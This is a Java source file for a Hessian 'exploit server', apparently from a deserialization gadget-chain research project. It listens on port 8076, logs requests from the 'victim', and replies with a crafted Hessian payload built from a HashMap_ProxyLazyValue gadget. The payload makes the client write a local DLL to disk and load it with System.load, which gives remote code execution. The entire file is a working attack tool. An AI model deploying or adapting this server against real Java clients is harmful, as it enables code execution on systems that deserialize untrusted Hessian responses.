package com.test.gadget.jndi;

import com.caucho.hessian.io.Hessian2Input;
import com.sun.net.httpserver.HttpExchange;
import com.sun.net.httpserver.HttpHandler;
import com.sun.net.httpserver.HttpServer;
import com.test.gadget.HashMap_ProxyLazyValue;
import tools.IOTools;

import java.io.IOException;
import java.io.InputStream;
import java.io.OutputStream;
import java.net.InetSocketAddress;


/**
 * 利用链为写 dll/so ，然后 System.load
 */
public class HessianServer implements Runnable{
    public static void main(String[] args) throws Exception {
        start(8076);
    }

    public static void start(int port) throws Exception {
        HttpServer server = HttpServer.create(new InetSocketAddress("0.0.0.0", port), 0);

        server.createContext("/hessian", new ExploitHandler());

        server.start();
        System.out.println("[+] Hessian Exploit Server started on port " + port);
    }

    @Override
    public void run() {
        try {
            start(8076);
        } catch (Exception e) {
            throw new RuntimeException(e);
        }
    }

    static class ExploitHandler implements HttpHandler {
        @Override
        public void handle(HttpExchange exchange) throws IOException {
            System.out.println("\n[*] Received Hessian request from victim!");

            // 读取请求 (用于调试)
            InputStream is = exchange.getRequestBody();
            Hessian2Input input = new Hessian2Input(is);

            try {
                // Hessian 调用格式
                String method = input.readMethod();
                System.out.println("    Method: " + method);

                // 读取参数 (如果有)
                int argCount = input.readMethodArgLength();
                System.out.println("    Arg count: " + argCount);

                for (int i = 0; i < argCount; i++) {
                    Object arg = input.readObject();
                    System.out.println("    Arg[" + i + "]: " + arg);
                }

            } catch (Exception e) {
                System.out.println("    (Error reading request: " + e.getMessage() + ")");
            }

            byte[] bytes = IOTools.readFile("dynamic.dll");
            String filename = "D:/1tmp/111.dll";
            byte[] body = null;
            try {
                body = (byte[]) HashMap_ProxyLazyValue.writeAndLoadLib(filename, bytes);
            } catch (Exception e) {
                throw new RuntimeException(e);
            }
            System.out.println("[+] Sending Hessian payload...");

            byte[] header = "HabF".getBytes();

            byte[] payload = new byte[header.length + body.length];

            System.arraycopy(header, 0, payload, 0, header.length);
            System.arraycopy(body, 0, payload, header.length, body.length);

            // 设置响应头
            exchange.sendResponseHeaders(200, payload.length);

            // 返回恶意 payload
            OutputStream os = exchange.getResponseBody();
            os.write(payload);

            System.out.println("[+] Payload sent!");
        }
    }
}
